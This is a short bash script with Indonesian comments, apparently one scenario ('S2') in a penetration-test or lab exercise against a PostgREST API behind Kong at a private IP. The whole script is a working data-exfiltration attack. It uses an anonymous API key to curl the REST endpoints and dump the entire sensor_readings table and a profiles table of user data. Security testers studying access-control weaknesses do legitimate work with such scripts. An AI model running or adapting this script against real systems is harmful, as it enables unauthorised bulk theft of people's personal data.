#!/bin/bash
# S2 - Data exfiltration lewat REST API (PostgREST di balik Kong)
TARGET="${1:-172.16.6.10}"
ANON="${ANON_KEY:?set ANON_KEY dulu, mis: source ./env.sh}"
echo "==================================================="
echo " S2  DATA EXFILTRATION via REST  ->  $TARGET"
echo "==================================================="
echo "--- Tarik seluruh tabel sensor_readings dengan anon key ---"
curl -s "http://$TARGET:8000/rest/v1/sensor_readings?select=*" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" | jq . 2>/dev/null | head -40
echo "--- Tarik seluruh tabel profiles (data pengguna) ---"
curl -s "http://$TARGET:8000/rest/v1/profiles?select=*" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" | jq . 2>/dev/null | head -40
